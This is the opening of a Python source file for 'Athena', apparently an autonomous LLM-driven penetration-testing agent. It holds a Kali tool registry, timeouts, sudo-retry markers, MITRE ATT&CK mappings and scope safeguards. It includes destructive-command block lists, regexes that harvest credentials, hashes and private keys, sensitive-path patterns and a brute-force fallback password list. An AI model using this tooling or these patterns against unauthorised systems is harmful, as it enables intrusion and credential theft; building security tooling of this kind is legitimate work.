#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           ATHENA — AI Offensive Security Agent v7.2              ║
║   Bare-metal Kali NetHunter  ·  Commander: The Priest             ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║   v7.2 — RELIABILITY + UI OVERHAUL                               ║
║                                                                  ║
║   FIXES (from v7.1 field-test failures)                          ║
║   • Tool dispatch no longer silently drops unknown kwargs.       ║
║     Common synonyms (skip_host_discovery, scan_type,             ║
║     timing_template, open_only, ...) are mapped to real flags.   ║
║     Truly unknown kwargs become a hard error fed back into the   ║
║     LLM's NEXT prompt — so it can correct, not loop.             ║
║   • Sudo escalation: when a command fails with permission        ║
║     denied / CAP_NET_RAW / requires-root markers, Athena         ║
║     offers to re-run with sudo (one-tap retry).                  ║
║   • Tool availability is checked BEFORE dispatch.  Missing       ║
║     binaries raise a structured error so the LLM pivots.         ║
║   • Type-safe scripts param: list/dict/json artifacts in the     ║
║     `scripts` arg are normalised to a comma-separated string.    ║
║   • Loop-breaker: same shell command twice → forced agent        ║
║     rotation + RED conf override.  Three times → handle_stuck.   ║
║   • Confidence is failure-aware: N consecutive fails on a node   ║
║     forces RED regardless of the LLM's self-rating.  Workflow    ║
║     CANNOT auto-complete on a streak of failures.                ║
║   • Phosh UI guard now confirms the package is INSTALLED         ║
║     (dpkg-query) before flagging — no more false-alarms on a     ║
║     phone where xfce was never installed.                        ║
║   • Per-command timeouts: top-ports/short scans 90s,             ║
║     full-range scans 600s, brute-force tools 1800s.              ║
║   • Boot lock auto-expires after 6h.                             ║
║                                                                  ║
║   UI OVERHAUL                                                    ║
║   • Every turn renders as a stack of titled boxes:               ║
║       ┌─ TURN N · target · agent · findings · ATT&CK · model ─┐  ║
║       ┌─ THOUGHT ─┐                                              ║
║       ┌─ DISPATCH ─┐                                             ║
║       ┌─ COMMAND  conf=GREEN  ATT&CK=T1046 ─┐                    ║
║       ┌─ EXECUTING ─┐ ... ┌─ RESULT ─┐                           ║
║       ┌─ FINDINGS +N ─┐                                          ║
║       ┌─ ⛔ ERROR ─┐  for permission/scope/destructive          ║
║   • Persistent status bar still rendered before each prompt.     ║
║                                                                  ║
║   PRESERVED FROM v7.1                                            ║
║   • Pentesting Task Tree (PTT)                                   ║
║   • 11 specialist agents, deterministic dispatch                 ║
║   • 28+ structured tool builders                                 ║
║   • MITRE ATT&CK auto-tagging                                    ║
║   • Scope / RoE enforcement                                      ║
║   • Attack graph (networkx)                                      ║
║   • Smart context manager + [NEED] re-fetches                    ║
║   • Auto credential fanout                                       ║
║   • Comprehensive Kali tool registry — 200+ tools                ║
║   • Groq provider chain                                          ║
║   • No on-disk persistence (except scope + logs + reports)       ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import getpass
import signal
import inspect
import datetime
import subprocess
import ipaddress
import shutil
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Tuple, Set

try:
    from groq import Groq
except ImportError:
    print("FATAL: groq package not installed. Run: pip install groq")
    sys.exit(1)

try:
    import networkx as nx
    HAS_NETWORKX = True
except ImportError:
    HAS_NETWORKX = False
    print("WARN: networkx not installed — attack graph disabled. "
          "Run: pip install networkx --break-system-packages")

try:
    import readline  # noqa: F401  (enables arrow keys in input())
except ImportError:
    pass


# ═════════════════════════════════════════════════════════════════════
# VERSION & PROVIDER CHAIN  (Groq only, biggest→smallest)
# ═════════════════════════════════════════════════════════════════════

VERSION = "7.2"

# Strict size descending. Compound models last because they have their
# own internal multi-step behaviour that fights our PTT control flow.
PROVIDER_CHAIN = [
    ("openai/gpt-oss-120b",                            "GPT-OSS 120B"),
    ("llama-3.3-70b-versatile",                        "LLaMA 3.3 70B"),
    ("qwen/qwen3-32b",                                 "Qwen3 32B"),
    ("openai/gpt-oss-20b",                             "GPT-OSS 20B"),
    ("meta-llama/llama-4-scout-17b-16e-instruct",      "LLaMA 4 Scout 17B"),
    ("llama-3.1-8b-instant",                           "LLaMA 3.1 8B"),
    ("allam-2-7b",                                     "Allam 2 7B"),
    ("groq/compound",                                  "Groq Compound"),
    ("groq/compound-mini",                             "Compound Mini"),
]


# ═════════════════════════════════════════════════════════════════════
# PATHS, LIMITS, MARKERS
# ═════════════════════════════════════════════════════════════════════

INSTALL_DIR = os.path.expanduser("~/.athena")
LOG_DIR     = os.path.join(INSTALL_DIR, "logs")
SCOPE_FILE  = os.path.join(INSTALL_DIR, "scope.json")
BOOT_LOCK   = "/tmp/athena_session.lock"

# v7.1 — smart context: keep more in memory, send less by default
MAX_HISTORY_MESSAGES   = 32   # how many turns kept in RAM
DEFAULT_HISTORY_SLICE  = 4    # how many sent to API by default
EXPANDED_HISTORY_SLICE = 10   # when stuck/yellow/red conf
MAX_OUTPUT_CHARS       = 5000
MAX_TOKENS_DEFAULT     = 2048
WORKFLOW_DONE          = "WORKFLOW_COMPLETE"

# How many [NEED] re-fetches allowed per turn (prevents runaway loops)
MAX_NEED_FETCHES = 2

# Stuck thresholds
STUCK_THRESHOLD      = 3   # rejects/repeats before pivot
NODE_ATTEMPT_LIMIT   = 4   # attempts on a single PTT node before mark dead-end


# ═════════════════════════════════════════════════════════════════════
# v7.2 — TIMEOUTS, SUDO MARKERS, BOOT LOCK TTL
# ═════════════════════════════════════════════════════════════════════

# Per-command timeout policy.  The bash subprocess is killed if it runs
# longer than the matched ceiling.  Pattern is regex-against-cmd; first
# match wins.  Default ceiling at the bottom.
COMMAND_TIMEOUTS = [
    (r'\bnmap\b.*-p\s*1?-\s*65535', 600),    # full-port nmap
    (r'\bnmap\b.*-p-\b',            600),    # full-port shorthand
    (r'\bmasscan\b',                300),
    (r'\brustscan\b',               300),
    (r'\bnmap\b.*--top-ports',       90),
    (r'\bnmap\b',                   180),
    (r'\b(hydra|medusa|patator|ncrack)\b', 1800),
    (r'\b(hashcat|john)\b',                 3600),
    (r'\b(gobuster|feroxbuster|ffuf|dirb|dirsearch)\b', 600),
    (r'\b(nikto|nuclei|wpscan)\b',           900),
    (r'\bsqlmap\b',                          900),
    (r'\b(theharvester|amass|subfinder)\b',  600),
    (r'\bsearchsploit\b',                     30),
    (r'\bcurl\b',                             45),
    (r'\barp-scan\b',                         60),
    (r'\bping\b',                             20),
]
DEFAULT_COMMAND_TIMEOUT = 300  # 5 min ceiling on anything else

# Markers in stdout/stderr that mean "needs root".  When detected after
# a non-sudo command, Athena offers an automatic sudo retry.
SUDO_RETRY_MARKERS = [
    "operation not permitted",
    "permission denied",
    "you don't have permission",
    "you must be root",
    "must be run as root",
    "must be root",
    "requires root",
    "are you root",
    "cap_net_raw",
    "cap_net_admin",
    "cap_dac_read_search",
    "(may need root)",
    "raw sockets",
    "couldn't open device",
    "bind: permission denied",
    "socket: operation not permitted",
]

# Boot-check lock TTL.  Re-run the system check if older than this.
BOOT_LOCK_TTL_SECONDS = 6 * 3600   # 6 hours

# v7.2 — kwarg synonym map for ToolBuilder.  When the LLM emits an arg
# that doesn't match the builder signature, we try one of these
# synonyms BEFORE giving up.  Maps {builder_name: {wrong_name: right_name}}.
# A right_name of None means "drop silently — this is a no-op alias".
KWARG_SYNONYMS = {
    "nmap": {
        # host-discovery ↔ -Pn
        "skip_host_discovery": "no_ping",
        "skip_discovery":      "no_ping",
        "no_host_discovery":   "no_ping",
        "treat_alive":         "no_ping",
        # scan-type — convert to canonical bool flags
        "scan_type":     "_scan_type",   # handled specially in nmap()
        "syn_scan":      "_scan_type",
        "tcp_scan":      "_scan_type",
        "connect_scan":  "_scan_type",
        # timing
        "timing_template": "timing",
        "T":               "timing",
        "speed":           "timing",
        # ports
        "port_range":      "ports",
        "port":            "ports",
        # script wording
        "nse_scripts":     "scripts",
        "script":          "scripts",
        "scripts_list":    "scripts",
        "script_categories": "scripts",
        # version / aggressive aliases
        "service_version": "version",
        "version_detect":  "version",
        "agg":             "aggressive",
        # open-only filter — push into extra_args
        "open_only":       "_open_only",
        "open":            "_open_only",
    },
    "masscan": {
        "use_root":    "use_sudo",
        "rate_pps":    "rate",
        "iface":       "interface",
        "port_range":  "ports",
    },
    "rustscan": {
        "rate":        "batch_size",
        "port_range":  "ports",
    },
    "gobuster_dir": {
        "url_target":  "url",
        "exts":        "extensions",
        "ext":         "extensions",
        "wordlist_path":"wordlist",
    },
    "feroxbuster": {
        "url_target":  "url",
        "exts":        "extensions",
        "ext":         "extensions",
    },
    "ffuf": {
        "target":      "url",
        "fuzz_loc":    "location",
    },
    "hydra": {
        "host":        "target",
        "user_list":   "userlist",
        "pass_list":   "passlist",
        "users":       "userlist",
        "passes":      "passlist",
        "threads":     "tasks",
    },
    "sqlmap": {
        "target":      "url",
        "lvl":         "level",
    },
    "curl_basic": {
        "head":        "head_only",
        "ua":          "user_agent",
        "useragent":   "user_agent",
        "username":    "user",
        "passwd":      "password",
    },
    "hashcat": {
        "hash":        "hash_file",
        "wordlist_path":"wordlist",
        "rule":        "rules",
    },
    "nuclei": {
        "url":         "target",
        "templates_dir":"templates",
    },
    "whatweb": {
        "agg":         "aggression",
        "level":       "aggression",
    },
    "crackmapexec": {
        "proto":       "protocol",
        "host":        "target",
        "username":    "user",
        "passwd":      "password",
        "u_list":      "userlist",
        "p_list":      "passlist",
    },
    # Tools without aliases (curl_basic etc) just inherit empty {}
}


# ═════════════════════════════════════════════════════════════════════
# SAFETY LISTS  (carried over from v6.1 — these work)
# ═════════════════════════════════════════════════════════════════════

BANNED_COMMANDS = [
    "apt upgrade", "apt full-upgrade",
    "apt-get upgrade", "apt-get full-upgrade", "apt dist-upgrade",
]
BANNED_UPGRADE_PACKAGES = ["phosh", "lightdm", "xfce", "x11", "gnome-shell"]

DESTRUCTIVE_COMMANDS = [
    r'\brm\s+-rf\s+/',
    r'\brm\s+-rf\s+\*',
    r'\brm\s+-rf\s+~',
    r'\bdd\s+if=',
    r'\bmkfs\b',
    r'>\s*/dev/sd[a-z]',
    r':\(\)\{.*\|.*&.*\};:',
    r'\bchmod\s+-R\s+777\s+/',
    r'\bchown\s+-R.*\s+/',
    r'\bshutdown\b',
    r'\bhalt\b',
    r'\binit\s+0',
    r'\binit\s+6',
    r'\bpoweroff\b',
]

DOUBLE_CONFIRM = [
    r'systemctl\s+(stop|disable|mask)',
    r'service\s+\S+\s+stop',
    r'iptables\s+-F',
    r'ufw\s+disable',
    r'>\s*/etc/',
    r'sed\s+-i.*\s+/etc/',
    r'echo.*>>\s*/etc/',
    r'echo.*>\s*/etc/',
    r'chmod\s+\+s\s+',
    r'useradd\s+',
    r'userdel\s+',
    r'passwd\s+',
    r'\bkillall\b',
]

INTERACTIVE_BLOCKED = {
    "msfconsole":   "Use: msfconsole -q -r /tmp/script.rc (script must end with 'exit')",
    "mysql -u":     "Use: mysql -u USER -pPASS -e 'QUERY;' for non-interactive query",
    "psql":         "Use: psql -c 'QUERY;' for non-interactive query",
    "telnet":       "Use: nc -nv [IP] [PORT] for one-shot banner grab",
    "nc -l":        "Listener blocked — would hang Athena. Run in separate terminal.",
    "ncat -l":      "Listener blocked — would hang Athena. Run in separate terminal.",
    "vim ":         "Use: cat or sed for non-interactive file ops",
    "vi ":          "Use: cat or sed for non-interactive file ops",
    "nano ":        "Use: cat or sed for non-interactive file ops",
    "less ":        "Use: cat or head/tail for non-interactive viewing",
    "more ":        "Use: cat or head/tail for non-interactive viewing",
    "top":          "Use: ps aux for non-interactive process list",
    "htop":         "Use: ps aux for non-interactive process list",
    "ssh ":         "SSH interactive — use sshpass -p PASS ssh user@host 'CMD' instead",
    "ftp ":         "FTP interactive — use curl ftp://user:pass@host/file instead",
    "gdb ":         "GDB interactive — use gdb -batch -ex 'cmd' instead",
}


# ═════════════════════════════════════════════════════════════════════
# COMPREHENSIVE KALI TOOL REGISTRY
#
# Athena uses this both to (a) tell the AI what's available so it stops
# proposing tools that don't exist, and (b) auto-install missing tools
# on demand.  Categorised for quick lookup by phase.
# ═════════════════════════════════════════════════════════════════════

KALI_TOOLS = {
    "network_recon": [
        "nmap", "masscan", "rustscan", "arp-scan", "fping", "netdiscover",
        "unicornscan", "zmap", "naabu", "zenmap",
    ],
    "service_enum": [
        "enum4linux", "enum4linux-ng", "smbclient", "smbmap", "rpcclient",
        "showmount", "nbtscan", "snmpwalk", "snmp-check", "onesixtyone",
        "ldapsearch", "redis-cli", "mongo", "mysql", "psql",
        "ldapenum", "ldap-utils",
    ],
    "web_recon": [
        "whatweb", "wafw00f", "httprobe", "httpx", "katana", "hakrawler",
        "subfinder", "amass", "assetfinder", "findomain", "gau",
        "waybackurls", "gospider",
    ],
    "web_brute": [
        "gobuster", "feroxbuster", "ffuf", "dirb", "dirsearch", "wfuzz",
        "arjun", "paramspider", "x8",
    ],
    "web_vuln": [
        "nikto", "nuclei", "wpscan", "joomscan", "droopescan", "cmsmap",
        "skipfish", "wapiti", "vega", "zap-baseline", "nuclei-templates",
        "owasp-zap", "burpsuite",
    ],
    "web_exploit": [
        "sqlmap", "commix", "tplmap", "xsstrike", "dalfox", "kxss",
        "nosqlmap", "ghauri", "jsql-injection",
    ],
    "ad_recon": [
        "enum4linux", "enum4linux-ng", "ldapsearch", "rpcclient", "kerbrute",
        "bloodhound", "bloodhound-python", "windapsearch", "adidnsdump",
        "powerview", "ad-ldap-enum", "sharphound",
    ],
    "ad_exploit": [
        "impacket-GetNPUsers", "impacket-GetUserSPNs", "impacket-secretsdump",
        "impacket-psexec", "impacket-wmiexec", "impacket-smbexec",
        "impacket-atexec", "impacket-ticketer", "impacket-getTGT",
        "impacket-goldenPac", "crackmapexec", "netexec", "certipy",
        "petitpotam", "printerbug", "coercer", "responder", "ntlmrelayx",
        "evil-winrm", "ldap2json", "rubeus",
    ],
    "credential": [
        "hydra", "medusa", "patator", "ncrack", "crackmapexec", "netexec",
        "kerbrute", "cewl", "crunch", "cupp", "username-anarchy",
    ],
    "cracking": [
        "hashcat", "john", "hashid", "hash-identifier", "ophcrack",
        "pyrit", "rsmangler", "cewl", "rsmangler",
    ],
    "exploit_db": [
        "searchsploit", "exploitdb", "msfconsole", "msfvenom", "msf-pro",
        "metasploit-framework",
    ],
    "post_exploit_linux": [
        "linpeas.sh", "linenum.sh", "lse.sh", "linux-exploit-suggester",
        "linux-exploit-suggester-2", "pspy", "unix-privesc-check",
        "linuxprivchecker", "gtfobins-cli",
    ],
    "post_exploit_windows": [
        "winpeas.exe", "winpeas.bat", "powerup.ps1", "sherlock.ps1",
        "watson.exe", "seatbelt.exe", "accesschk", "powerless",
        "windows-exploit-suggester", "wesng",
    ],
    "tunneling": [
        "chisel", "ligolo-ng", "socat", "ssh", "sshuttle", "ngrok",
        "frp", "gost", "iodine", "dnscat2", "ptunnel-ng",
    ],
    "wireless": [
        "aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng",
        "wifite", "kismet", "reaver", "bully", "pixiewps", "hcxdumptool",
        "hcxtools", "bettercap", "wifiphisher", "fluxion", "fern-wifi-cracker",
    ],
    "bluetooth": [
        "hciconfig", "hcitool", "sdptool", "bluetoothctl", "btscanner",
        "blueranger", "spooftooph", "redfang", "rfcomm",
    ],
    "rfid_nfc": [
        "mfoc", "mfcuk", "proxmark3", "libnfc", "nfc-list",
    ],
    "evasion": [
        "veil", "shellter", "msfvenom", "donut", "phantom-evasion",
        "obfuscapk", "macchanger", "proxychains4",
    ],
    "forensics": [
        "volatility3", "volatility", "binwalk", "foremost", "scalpel",
        "autopsy", "sleuthkit", "bulk_extractor", "guymager", "dc3dd",
        "dd_rescue", "testdisk", "photorec",
    ],
    "stego": [
        "steghide", "stegseek", "zsteg", "outguess", "openstego",
        "stegoveritas", "exiftool", "exiv2", "pngcheck", "stegsolve",
    ],
    "reverse_engineering": [
        "ghidra", "radare2", "rizin", "cutter", "gdb", "gdb-multiarch",
        "ltrace", "strace", "objdump", "readelf", "nm", "checksec",
        "ropper", "ROPgadget", "pwntools", "angr", "frida", "apktool",
    ],
    "mobile": [
        "apktool", "dex2jar", "jadx", "frida", "objection", "drozer",
        "mobsf", "androguard", "qark",
    ],
    "osint": [
        "theharvester", "maltego", "spiderfoot", "recon-ng", "shodan",
        "sherlock", "holehe", "phoneinfoga", "exiftool", "metagoofil",
        "fierce", "dnsenum", "dnsrecon", "dnstwist", "sublist3r",
        "subfinder", "amass",
    ],
    "container_cloud": [
        "docker", "kubectl", "kube-hunter", "kube-bench", "trivy",
        "grype", "syft", "checkov", "tfsec", "prowler", "scoutsuite",
        "cloudsploit", "pacu", "cloudfox", "peirates",
    ],
    "fuzzing": [
        "ffuf", "wfuzz", "afl-fuzz", "honggfuzz", "boofuzz", "radamsa",
        "patator", "ftpfuzz",
    ],
    "ssl_tls": [
        "sslscan", "sslyze", "testssl.sh", "tlssled", "openssl",
    ],
    "dns": [
        "dig", "host", "nslookup", "dnsrecon", "dnsenum", "dnstwist",
        "fierce", "dnscan", "amass", "puredns",
    ],
    "misc_useful": [
        "curl", "wget", "nc", "ncat", "socat", "tmux", "screen",
        "jq", "tee", "xxd", "hexdump", "base64", "openssl", "tshark",
        "tcpdump", "wireshark", "ettercap", "bettercap", "mitmproxy",
        "responder", "git", "python3", "pip3",
    ],
}


def all_kali_tools_flat() -> List[str]:
    seen = set()
    flat = []
    for cat, tools in KALI_TOOLS.items():
        for t in tools:
            if t not in seen:
                seen.add(t)
                flat.append(t)
    return flat


def kali_tool_summary_for_prompt() -> str:
    """Compressed list for system prompts so AI knows what's available."""
    parts = []
    for cat, tools in KALI_TOOLS.items():
        # Trim to the most important per category to save tokens
        parts.append(f"  {cat}: {', '.join(tools[:10])}")
    return "KALI ARSENAL AVAILABLE:\n" + "\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# FINDING PATTERNS — strict, context-aware
#
# Lessons from v6.1: regex like `(?:password|pass)[:\s=]+(\S+)` matches
# the AI's own thinking ("...try password: helper...") and pollutes
# state.  v7.0 only runs these on raw subprocess stdout, never on the
# model's text.  Patterns are also tightened so noise like "200:not"
# (which came from "user:200, pass:not" in the AI's prose) can't match.
# ═════════════════════════════════════════════════════════════════════

FINDING_PATTERNS = {
    # IPv4 addresses
    "ip":        r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',

    # Open ports from nmap-style output: "22/tcp open ssh"
    # Only capture the port number — service name comes via 'svc' key
    "port":      r'(\d{1,5})/(?:tcp|udp)\s+open\s+\S+',

    # Service+version: "22/tcp open ssh OpenSSH 8.2p1"
    "svc":       r'\d+/(?:tcp|udp)\s+open\s+\S+\s+([A-Za-z][A-Za-z0-9\-_\. ]{2,60}\d+(?:\.\d+)*[A-Za-z0-9]*)',

    # Usernames found in tool output (NOT prose) — needs preceding label
    "user":      r'(?:^|\n|\s)(?:Username|User|Login|sAMAccountName|uid)[:\s=]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,32})\b',

    # NTLM hashes (LM:NTLM)
    "hash_ntlm": r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',

    # Generic hex hash 32-64 chars on its own line/field (avoids matching cve numbers)
    "hash":      r'(?:^|\n|\s|:|=)([a-fA-F0-9]{32,64})(?:\s|$|:)',

    # Kerberos AS-REP / TGS-REP hashes
    "krb_hash":  r'(\$krb5(?:asrep|tgs)\$\S+)',

    # NetNTLMv2
    "ntlmv2":    r'([^\s]+::[^:]+:[a-fA-F0-9]{32}:[a-fA-F0-9]+)',

    # CVEs
    "cve":       r'\b(CVE-\d{4}-\d{4,7})\b',

    # Domains (broad — gets filtered)
    "domain":    r'\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z]{2,})+)\b',

    # URLs
    "url":       r'(https?://[^\s\'"<>]+)',

    # Credentials — REQUIRES colon or equals after the field name.
    # Word boundary on the left prevents matching "Mypassword:".
    # Whitespace-only separator is rejected (kills prose like "password not").
    "cred":      r'(?<![a-zA-Z])(?:[Pp]assword|[Pp]asswd|[Cc]redentials?)\s*[:=]\s*(\S{4,64})\b',

    # SMB shares
    "smb_share": r'\\\\[\d\.]+\\([A-Za-z0-9_\-\$]+)',

    # Email addresses
    "email":     r'\b([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})\b',

    # SSH private key markers
    "ssh_key":   r'(-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----)',

    # AWS-style keys
    "aws_key":   r'\b(AKIA[0-9A-Z]{16})\b',
}

# These IPs are noise — don't add them as findings
IP_NOISE = {
    '0.0.0.0', '127.0.0.1', '255.255.255.255',
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '169.254.169.254',  # cloud metadata — noted elsewhere, not a finding
}

# Domains that are noise (shown in command outputs but not real findings)
DOMAIN_NOISE = {
    'localhost', 'example.com', 'google.com', 'cloudflare.com',
    'localdomain', 'arpa', 'in-addr.arpa',
}


# Sensitive paths to flag as "exposed_path" findings if found in output
SENSITIVE_PATH_PATTERNS = [
    r'\.ssh/',
    r'\.bash_history',
    r'\.bashrc\b',
    r'\.git/',
    r'\.env\b',
    r'\.aws/',
    r'wp-config\.php',
    r'config\.php',
    r'/etc/passwd',
    r'/etc/shadow',
    r'/etc/hosts',
    r'id_rsa\b',
    r'id_ed25519\b',
    r'id_ecdsa\b',
    r'authorized_keys',
    r'\.htpasswd',
    r'web\.config',
    r'database\.yml',
    r'application\.properties',
    r'\.npmrc\b',
    r'\.docker/config\.json',
    r'\.kube/config',
]


# Wordlists for credential attacks (fallback to hardcoded if files missing)
CRED_WORDLISTS = [
    "/usr/share/wordlists/metasploit/common_passwords.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
    "/usr/share/seclists/Passwords/probable-v2-top1575.txt",
]

FALLBACK_PASSWORDS = [
    "admin", "password", "123456", "root", "toor", "kali",
    "admin123", "password123", "letmein", "welcome", "default",
    "Password1", "Passw0rd!", "P@ssw0rd", "changeme", "qwerty",
]


# ═════════════════════════════════════════════════════════════════════
# MITRE ATT&CK MAPPING (v7.1)
#
# Auto-tag commands and findings with technique IDs so reports can be
# grouped by ATT&CK technique — the professional standard for pentest
# deliverables.  Pattern-based: command substring or finding type
# triggers the tag.  First match wins.
# ═════════════════════════════════════════════════════════════════════

MITRE_TECHNIQUES = [
    # (regex / substring pattern, technique_id, technique_name, tactic)
    (r'\bnmap\b.*-(sS|sT|sV|sU|p-|p\d)',  "T1046",        "Network Service Discovery",       "Discovery"),
    (r'\b(rustscan|masscan|naabu)\b',     "T1046",        "Network Service Discovery",       "Discovery"),
    (r'\barp-scan\b|\bnetdiscover\b',     "T1018",        "Remote System Discovery",         "Discovery"),
    (r'\bping\b\s+-?[abc]?\s*\d',         "T1018",        "Remote System Discovery",         "Discovery"),
    (r'\bwhatweb\b|\bwafw00f\b',          "T1592.002",    "Software Discovery",              "Reconnaissance"),
    (r'\b(gobuster|feroxbuster|ffuf|dirb|dirsearch)\b', "T1595.003", "Wordlist Scanning",  "Reconnaissance"),
    (r'\bnikto\b|\bnuclei\b',             "T1595.002",    "Vulnerability Scanning",          "Reconnaissance"),
    (r'\b(theharvester|sublist3r|amass|subfinder)\b',   "T1590",     "Gather Victim Network Info","Reconnaissance"),
    (r'\bwhois\b|\bdig\b\s|\bdnsrecon\b|\bdnsenum\b',   "T1590.002", "DNS",                       "Reconnaissance"),
    (r'\bcrt\.sh\b|\bcurl.*crt\.sh',      "T1596.003",    "Digital Certificates",            "Reconnaissance"),
    (r'\bsslscan\b|\btestssl\b|\bsslyze\b','T1592.002',   "Software (SSL/TLS)",              "Reconnaissance"),
    (r'\bsearchsploit\b',                 "T1588.005",    "Obtain Capabilities: Exploits",   "Resource Development"),
    (r'\b(hydra|medusa|patator|ncrack)\b','T1110.001',    "Brute Force: Password Guessing",  "Credential Access"),
    (r'\bspray|--continue-on-success',    "T1110.003",    "Password Spraying",               "Credential Access"),
    (r'\b(hashcat|john)\b',               "T1110.002",    "Brute Force: Password Cracking",  "Credential Access"),
    (r'\bkerbrute\b.*userenum',           "T1589.002",    "Email Addresses (Username Enum)", "Reconnaissance"),
    (r'\bGetNPUsers\b|asreproast|AS-REP', "T1558.004",    "AS-REP Roasting",                 "Credential Access"),
    (r'\bGetUserSPNs\b|kerberoast',       "T1558.003",    "Kerberoasting",                   "Credential Access"),
    (r'\bsecretsdump\b|\blsadump\b',      "T1003",        "OS Credential Dumping",           "Credential Access"),
    (r'\bdcsync\b|--just-dc',             "T1003.006",    "DCSync",                          "Credential Access"),
    (r'\bresponder\b|\bllmnr\b',          "T1557.001",    "LLMNR/NBT-NS Poisoning",          "Credential Access"),
    (r'\bntlmrelayx\b|\bntlm.relay\b',    "T1557.001",    "NTLM Relay",                      "Credential Access"),
    (r'\b(petitpotam|coercer|printerbug)\b','T1187',      "Forced Authentication",           "Credential Access"),
    (r'\bbloodhound\b|\bsharphound\b',    "T1087.002",    "Domain Account Discovery",        "Discovery"),
    (r'\benum4linux\b|\brpcclient\b|\bldapsearch\b',    "T1087.002", "Domain Account Discovery", "Discovery"),
    (r'\bsmbclient\b|\bsmbmap\b|\bnxc\s+smb',           "T1135",     "Network Share Discovery",  "Discovery"),
    (r'\bsqlmap\b|\bunion\s+select|\b\'\s*OR\s*\'1',    "T1190",     "Exploit Public-Facing App","Initial Access"),
    (r'\bmsfconsole\b|\bmsf\b.*exploit',  "T1203",        "Exploitation for Client Execution","Execution"),
    (r'\bmsfvenom\b',                     "T1588.001",    "Obtain Capabilities: Malware",    "Resource Development"),
    (r'\bevil-winrm\b|\bwinrm\b',         "T1021.006",    "Remote Services: WinRM",          "Lateral Movement"),
    (r'\bpsexec\b|\bwmiexec\b|\batexec\b','T1021.002',    "SMB/Windows Admin Shares",        "Lateral Movement"),
    (r'\bxfreerdp\b|\brdesktop\b',        "T1021.001",    "Remote Services: RDP",            "Lateral Movement"),
    (r'\bsshpass\b|\bssh\s+-i\s',         "T1021.004",    "Remote Services: SSH",            "Lateral Movement"),
    (r'\b-Pa(s|ss)?\s*[Tt]he[Hh]ash|--pass-the-hash|-H\s+[a-f0-9]{32}', "T1550.002", "Pass the Hash", "Defense Evasion"),
    (r'\b(linpeas|linenum|lse\.sh|linux-exploit-suggester)\b', "T1082", "System Information Discovery", "Discovery"),
    (r'\b(winpeas|seatbelt|powerup|sherlock|watson)\b', "T1082",   "System Information Discovery",   "Discovery"),
    (r'\bsudo\s+-l\b|find.*-perm.*4000',  "T1548.003",    "Sudo and Sudo Caching",           "Privilege Escalation"),
    (r'\bgetcap\b',                       "T1548",        "Abuse Elevation Control",         "Privilege Escalation"),
    (r'\b(printspoofer|godpotato|juicypotato|roguepotato)\b', "T1134.002", "Token Impersonation/Theft", "Privilege Escalation"),
    (r'\bcertutil\b|\bbitsadmin\b',       "T1105",        "Ingress Tool Transfer",           "Command and Control"),
    (r'\bchisel\b|\bligolo\b|\bsocat\b.*TCP',  "T1572",   "Protocol Tunneling",              "Command and Control"),
    (r'\bproxychains\b',                  "T1090",        "Proxy",                           "Command and Control"),
    (r'\bmacchanger\b',                   "T1036.005",    "Match Legitimate Name",           "Defense Evasion"),
    (r'-T1\b|--scan-delay|--data-length|-D\s+RND', "T1027", "Obfuscated Files or Information", "Defense Evasion"),
    (r'\bbase64\s+-d|\bbase64\s+--decode','T1140',        "Deobfuscate/Decode Files",        "Defense Evasion"),
    (r'\bsteghide\b|\bzsteg\b|\bbinwalk\b','T1027.003',   "Steganography",                   "Defense Evasion"),
    (r'\bvolatility\b',                   "T1003.001",    "LSASS Memory",                    "Credential Access"),
    (r'/etc/passwd|/etc/shadow',          "T1003.008",    "/etc/passwd and /etc/shadow",     "Credential Access"),
    (r'\bcurl\b.*169\.254\.169\.254',     "T1552.005",    "Cloud Instance Metadata API",     "Credential Access"),
    (r'\bdocker\s+(run|exec).*-v\s+/',    "T1611",        "Escape to Host",                  "Privilege Escalation"),
]

# Tag findings by their type when no command pattern matched
MITRE_BY_FINDING = {
    "ip":        ("T1018",     "Remote System Discovery",         "Discovery"),
    "port":      ("T1046",     "Network Service Discovery",       "Discovery"),
    "svc":       ("T1592.002", "Software",                        "Reconnaissance"),
    "user":      ("T1087",     "Account Discovery",               "Discovery"),
    "cred":      ("T1078",     "Valid Accounts",                  "Initial Access"),
    "hash":      ("T1003",     "OS Credential Dumping",           "Credential Access"),
    "hash_ntlm": ("T1003.001", "LSASS Memory",                    "Credential Access"),
    "krb_hash":  ("T1558",     "Steal or Forge Kerberos Tickets", "Credential Access"),
    "ntlmv2":    ("T1557.001", "LLMNR/NBT-NS Poisoning",          "Credential Access"),
    "cve":       ("T1190",     "Exploit Public-Facing App",       "Initial Access"),
    "ssh_key":   ("T1552.004", "Private Keys",                    "Credential Access"),
    "aws_key":   ("T1552.001", "Credentials In Files",            "Credential Access"),
    "smb_share": ("T1135",     "Network Share Discovery",         "Discovery"),
    "email":     ("T1589.002", "Email Addresses",                 "Reconnaissance"),
    "domain":    ("T1590.002", "DNS",                             "Reconnaissance"),
    "url":       ("T1595",     "Active Scanning",                 "Reconnaissance"),
    "exposed_path": ("T1083",  "File and Directory Discovery",    "Discovery"),
}


def attack_id_for_command(cmd: str) -> Optional[Tuple[str, str, str]]:
    """Return (technique_id, name, tactic) for a command, or None."""
    if not cmd:
        return None
    for pattern, tid, name, tactic in MITRE_TECHNIQUES:
        try:
            if re.search(pattern, cmd, re.IGNORECASE):
                return (tid, name, tactic)
        except re.error:
            continue
    return None


def attack_id_for_finding(ftype: str) -> Optional[Tuple[str, str, str]]:
    """Return (technique_id, name, tactic) for a finding type, or None."""
    return MITRE_BY_FINDING.get(ftype)


# Exit-code semantics for run_command return values
